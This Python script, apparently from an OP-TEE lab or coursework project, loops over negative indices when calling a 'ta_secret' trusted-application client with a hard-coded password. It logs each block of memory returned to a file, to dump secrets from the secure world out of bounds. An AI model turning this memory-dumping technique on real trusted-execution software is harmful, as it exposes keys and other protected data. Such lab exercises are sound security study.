import sys
import time
import string
import statistics

import subprocess

TA_APP = "ta_secret -a "  # Command to test the token
TA_PWD = " Alfonso"
output_file = "/mnt/host/optee_examples/project/test/memory.txt" #Change the name of the folder according to your project name

# Global child process
child = None

# Custom exception for when the password is found
class End(Exception):
    def __init__(self, end):
        self.end = end

def map_memory():
    index = 0
    while True:
        try:
            print(f"Trying index: {index}")
            result = subprocess.Popen(
                                        TA_APP + f"{index} {index}" + TA_PWD,
                                        shell=True,
                                        stdout=subprocess.PIPE,
                                        stderr=subprocess.PIPE
                                    )
            for line in result.stdout:
                line = line.split(b" - ")
                hex_output = ' '.join(f'{byte:02x}' for byte in line[0]) + "\n"
                char_output = ''.join(f'{byte:c}' for byte in line[0]) + "\n"
                if len(line) == 2:
                    with open(output_file, "a") as f:
                        f.write(f"Index: {index}; {TA_APP} {index} {index}\n")
                        f.write(char_output)
                        # f.write(hex_output)
            result.wait()
            stdout_data, stderr_data = result.communicate()
            index -= 1
            if result.returncode != 0:
                print(f"Process returned error: {stderr_data.decode('utf-8')}")
                break
        except Exception as e:
            print(f"[!] Error: {e}")
            break

def main():
    global child

    print("Will start to try to hack\n")
    map_memory()
    print("Hacked")

if __name__ == '__main__':
    main()
